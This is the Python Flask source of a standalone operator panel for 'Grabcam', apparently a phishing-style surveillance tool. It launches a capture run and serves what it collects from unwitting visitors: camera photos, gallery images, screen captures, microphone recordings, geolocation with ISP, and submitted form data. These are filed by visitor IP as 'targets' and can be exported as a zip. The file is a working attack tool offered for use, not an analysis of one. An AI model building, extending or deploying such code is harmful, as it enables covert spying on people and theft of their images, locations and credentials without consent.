#!/usr/bin/env python3
"""
Grabcam — автономный запуск без OSINT Panel.
Запуск из папки grabcam: python standalone/app.py
Или из standalone: python app.py
Автор: ERRORoX
"""
import io
import json
import os
import sys
import zipfile
from urllib.parse import quote

_STANDALONE_DIR = os.path.dirname(os.path.abspath(__file__))
_GRABCAM_DIR = os.path.dirname(_STANDALONE_DIR)
_PROJECT_ROOT = os.path.dirname(os.path.dirname(_GRABCAM_DIR))

sys.path.insert(0, _PROJECT_ROOT)
sys.path.insert(0, os.path.join(_PROJECT_ROOT, "backend"))

from flask import Flask, request, jsonify, send_from_directory, send_file
from backend.tools.tool_grabcam import ToolGrabcam
from tools.analytics_diagnostics import record_server_error, summary as analytics_summary

app = Flask(__name__, static_folder=_STANDALONE_DIR, static_url_path="")
tool = ToolGrabcam()


@app.after_request
def _record_server_diagnostics(response):
    # Operational failures only: never record visitor IPs, payloads, credentials,
    # media, location data, query strings, or request headers.
    if response.status_code >= 500:
        try:
            record_server_error(request.endpoint, response.status_code)
        except Exception:
            pass
    return response


@app.route("/api/analytics/diagnostics", methods=["GET"])
def api_analytics_diagnostics():
    # Diagnostics are restricted to the local machine.
    if request.remote_addr not in ("127.0.0.1", "::1"):
        return jsonify({"error": "Доступ разрешён только с этого компьютера."}), 403
    origin = request.headers.get("Origin")
    if origin and not (
        origin.startswith("http://127.0.0.1:")
        or origin.startswith("http://localhost:")
        or origin.startswith("http://[::1]:")
    ):
        return jsonify({"error": "Недопустимый источник запроса."}), 403
    return jsonify(analytics_summary())

_GRABCAM_PHOTO_DIR = os.path.join(_GRABCAM_DIR, "Photo")
_GRABCAM_FORM_FILE = os.path.join(_GRABCAM_DIR, "form_captures.json")
_GRABCAM_OPTIONS_FILE = os.path.join(_GRABCAM_DIR, "options.json")
_PANEL_DIR = os.path.join(_GRABCAM_DIR, "panel")
_STATIC_CSS_DIR = os.path.join(_PROJECT_ROOT, "static", "css")


def _parse_geo_info(content):
    d = {"ip": "", "country": "", "region": "", "city": "", "lat": "", "lon": "", "isp": "", "last_update": ""}
    for line in content.splitlines():
        line = line.strip()
        if ":" not in line:
            continue
        key, _, val = line.partition(":")
        key, val = key.strip().lower(), val.strip()
        if key == "ip": d["ip"] = val
        elif key == "country": d["country"] = val
        elif key == "region": d["region"] = val
        elif key == "city": d["city"] = val
        elif key == "latitude": d["lat"] = val
        elif key == "longitude": d["lon"] = val
        elif key == "isp": d["isp"] = val
        elif key == "last update": d["last_update"] = val
    return d


def _collect_media(media_type, extensions):
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return []
    items = []
    for name in os.listdir(_GRABCAM_PHOTO_DIR):
        sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
        type_dir = os.path.join(sub, media_type)
        if not os.path.isdir(type_dir) or ".." in name:
            continue
        for f in os.listdir(type_dir):
            if not any(f.lower().endswith(ext) for ext in extensions):
                continue
            full = os.path.join(type_dir, f)
            try:
                mtime = os.path.getmtime(full)
            except OSError:
                mtime = 0
            rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR).replace("\\", "/")
            items.append({"path": rel, "mtime": mtime, "ip": name})
    return items


@app.route("/")
def index():
    return send_from_directory(_STANDALONE_DIR, "index.html")


@app.route("/api/tools/grabcam/run", methods=["POST"])
def api_run():
    data = request.get_json(silent=True) or {}
    result = tool.run(data)
    if result.get("local_url"):
        host = (request.host or "127.0.0.1:5000").split(":")[0]
        result["local_url"] = "http://{}:3333".format(host)
    return jsonify(result)


@app.route("/api/tools/grabcam/run-status", methods=["GET"])
def api_run_status():
    st = tool.get_run_status()
    if st.get("local_url"):
        host = (request.host or "127.0.0.1:5000").split(":")[0]
        st["local_url"] = "http://{}:3333".format(host)
    return jsonify(st)


@app.route("/api/tools/grabcam/session-stats", methods=["GET"])
def api_session_stats():
    unique_ips = set()
    if os.path.isdir(_GRABCAM_PHOTO_DIR):
        for name in os.listdir(_GRABCAM_PHOTO_DIR):
            sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
            if os.path.isdir(sub) and ".." not in name and name.strip():
                unique_ips.add(name.strip())
    if os.path.isfile(_GRABCAM_FORM_FILE):
        try:
            with open(_GRABCAM_FORM_FILE, "r", encoding="utf-8", errors="replace") as f:
                data = json.load(f)
            for c in (data.get("captures") or []):
                ip = (c.get("ip") or "").strip()
                if ip:
                    unique_ips.add(ip)
        except (OSError, ValueError):
            pass
    n = len(unique_ips)
    return jsonify({"unique_ips": n, "targets": n})


@app.route("/api/tools/grabcam/stop", methods=["POST"])
def api_stop():
    ok, msg = tool.stop_run()
    return jsonify({"success": ok, "message": msg})


@app.route("/api/tools/grabcam/photos", methods=["GET"])
def api_photos():
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return jsonify({"photos": [], "total": 0, "unique_devices": 0})
    limit = min(int(request.args.get("limit", 30) or 30), 100)
    allowed = ("back", "front", "gallery")
    photos = []
    for root, _, files in os.walk(_GRABCAM_PHOTO_DIR):
        for f in files:
            if f.lower().endswith((".png", ".jpg", ".jpeg")):
                full = os.path.join(root, f)
                try:
                    mtime = os.path.getmtime(full)
                except OSError:
                    mtime = 0
                rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR).replace("\\", "/")
                if ".." in rel: continue
                parts = rel.split("/")
                ip = parts[0] if len(parts) >= 1 else ""
                camera = parts[1] if len(parts) >= 2 else ""
                if camera not in allowed: continue
                photos.append({"path": rel, "mtime": mtime, "ip": ip, "camera": camera})
    photos.sort(key=lambda x: -x["mtime"])
    total = len(photos)
    unique = len(set(p["ip"] for p in photos))
    photos = photos[:limit]
    for p in photos:
        p["url"] = "/api/tools/grabcam/photo?path=" + quote(p["path"], safe="")
    return jsonify({"photos": photos, "total": total, "unique_devices": unique})


@app.route("/api/tools/grabcam/photo", methods=["GET"])
def api_photo():
    path = (request.args.get("path") or "").strip()
    if not path or ".." in path or path.startswith("/") or "\\" in path:
        return "", 404
    path = path.replace("\\", "/")
    return send_from_directory(_GRABCAM_PHOTO_DIR, path)


@app.route("/api/tools/grabcam/screen", methods=["GET"])
def api_screen():
    limit = min(int(request.args.get("limit", 30) or 30), 100)
    items = _collect_media("screen", (".png", ".jpg", ".jpeg"))
    items.sort(key=lambda x: -x["mtime"])
    items = items[:limit]
    for p in items:
        p["url"] = "/api/tools/grabcam/photo?path=" + quote(p["path"], safe="")
    return jsonify({"items": items, "total": len(items)})


@app.route("/api/tools/grabcam/audio", methods=["GET"])
def api_audio():
    limit = min(int(request.args.get("limit", 50) or 50), 150)
    items = _collect_media("audio", (".webm", ".mp4", ".ogg", ".wav"))
    items.sort(key=lambda x: -x["mtime"])
    items = items[:limit]
    for p in items:
        p["url"] = "/api/tools/grabcam/file?path=" + quote(p["path"], safe="")
    return jsonify({"items": items, "total": len(items)})


@app.route("/api/tools/grabcam/file", methods=["GET"])
def api_file():
    path = (request.args.get("path") or "").strip()
    if not path or ".." in path or path.startswith("/") or "\\" in path:
        return "", 404
    return send_from_directory(_GRABCAM_PHOTO_DIR, path.replace("\\", "/"))


@app.route("/api/tools/grabcam/locations", methods=["GET"])
def api_locations():
    if not os.path.isdir(_GRABCAM_PHOTO_DIR):
        return jsonify({"locations": []})
    locations = []
    for name in os.listdir(_GRABCAM_PHOTO_DIR):
        sub = os.path.join(_GRABCAM_PHOTO_DIR, name)
        if not os.path.isdir(sub) or ".." in name:
            continue
        geo_file = os.path.join(sub, "geo_info.txt")
        if not os.path.isfile(geo_file):
            continue
        try:
            with open(geo_file, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
        except OSError:
            continue
        geo = _parse_geo_info(content)
        geo["device_id"] = name
        try:
            geo["mtime"] = os.path.getmtime(geo_file)
        except OSError:
            geo["mtime"] = 0
        locations.append(geo)
    locations.sort(key=lambda x: -x["mtime"])
    return jsonify({"locations": locations})


@app.route("/api/tools/grabcam/options", methods=["GET"])
def api_options_get():
    default = {"camera": True, "geo": True, "form": True, "gallery": False, "mic": False, "screen": False}
    if os.path.isfile(_GRABCAM_OPTIONS_FILE):
        try:
            with open(_GRABCAM_OPTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            for k in default:
                if k in data and isinstance(data[k], bool):
                    default[k] = data[k]
        except (OSError, ValueError):
            pass
    return jsonify(default)


@app.route("/api/tools/grabcam/options", methods=["POST"])
def api_options_post():
    data = request.get_json(silent=True) or {}
    options = {
        "camera": bool(data.get("camera", True)),
        "geo": bool(data.get("geo", True)),
        "form": bool(data.get("form", True)),
        "gallery": bool(data.get("gallery", False)),
        "mic": bool(data.get("mic", False)),
        "screen": bool(data.get("screen", False)),
    }
    try:
        with open(_GRABCAM_OPTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(options, f, ensure_ascii=False, indent=2)
    except OSError:
        return jsonify({"success": False, "error": "Не удалось записать"}), 500
    return jsonify({"success": True, "options": options})


@app.route("/api/tools/grabcam/form-captures", methods=["GET"])
def api_form_captures():
    limit = min(int(request.args.get("limit", 100) or 100), 500)
    captures = []
    if os.path.isfile(_GRABCAM_FORM_FILE):
        try:
            with open(_GRABCAM_FORM_FILE, "r", encoding="utf-8", errors="replace") as f:
                data = json.load(f)
            captures = (data.get("captures") or [])[-limit:]
            captures = list(reversed(captures))
        except (OSError, ValueError):
            pass
    return jsonify({"captures": captures})


@app.route("/api/tools/grabcam/export", methods=["GET"])
def api_export():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        if os.path.isfile(_GRABCAM_FORM_FILE):
            with open(_GRABCAM_FORM_FILE, "r", encoding="utf-8", errors="replace") as f:
                zf.writestr("form_captures.json", f.read())
        report = ["Grabcam Export", "===============", ""]
        if os.path.isdir(_GRABCAM_PHOTO_DIR):
            for root, _, files in os.walk(_GRABCAM_PHOTO_DIR):
                for f in files:
                    full = os.path.join(root, f)
                    rel = os.path.relpath(full, _GRABCAM_PHOTO_DIR).replace("\\", "/")
                    try:
                        zf.write(full, "Photo/" + rel)
                    except OSError:
                        pass
        zf.writestr("report.txt", "\n".join(report))
    buf.seek(0)
    return send_file(buf, mimetype="application/zip", as_attachment=True, download_name="grabcam_export.zip")


@app.route("/css/<path:path>")
def project_css(path):
    """Те же файлы, что и в полном OSINT Panel (variables.css, layout.css)."""
    return send_from_directory(_STATIC_CSS_DIR, path)


@app.route("/panel/<path:path>")
def panel_static(path):
    return send_from_directory(_PANEL_DIR, path)


@app.route("/grabcam/panel/<path:path>")
def grabcam_panel_static(path):
    """Те же пути, что и в полной панели — одни и те же файлы Grabcam."""
    return send_from_directory(_PANEL_DIR, path)


if __name__ == "__main__":
    print("Grabcam (автономный режим). Откройте http://127.0.0.1:5050")
    print("Выход: Ctrl+C")
    app.run(host="0.0.0.0", port=5050, debug=False)
